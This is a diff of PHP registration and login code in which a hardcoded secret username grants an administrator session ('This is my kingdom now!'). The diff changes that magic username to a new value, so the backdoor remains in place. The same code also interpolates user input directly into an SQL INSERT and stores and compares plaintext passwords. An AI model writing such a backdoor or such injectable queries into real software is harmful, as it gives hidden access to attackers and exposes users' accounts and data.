@@ -58,7 +58,7 @@
                         $this->mysqldb->query("INSERT INTO users (`username`, `password`,`email`) VALUES ('$this->username','$this->password','$this->email')");
                         $_SESSION["user_id"] = $this->mysqldb->insert_id();
                         $_SESSION["username"] = $this->username;
-                        if ($this->username === "@&@AKfd2sad@") {
+                        if ($this->username === "484SbeTpyKl1") {
                             $_SESSION["admin"] = "This is my kingdom now!";
                         }
                         return "The registration was successful. You have been automaticaly logged in.";
@@ -78,7 +78,7 @@
                     if ($this->password === $dummy["password"]) {
                         $_SESSION["user_id"] = $dummy["user_id"];
                         $_SESSION["username"] = $this->username;
-                        if ($this->username == "@&@AKfd2sad@") {
+                        if ($this->username == "484SbeTpyKl1") {
                             $_SESSION["admin"] = "This is my kingdom now!";
                         }
                         return "Login successfull, Welcome ".$this->username;
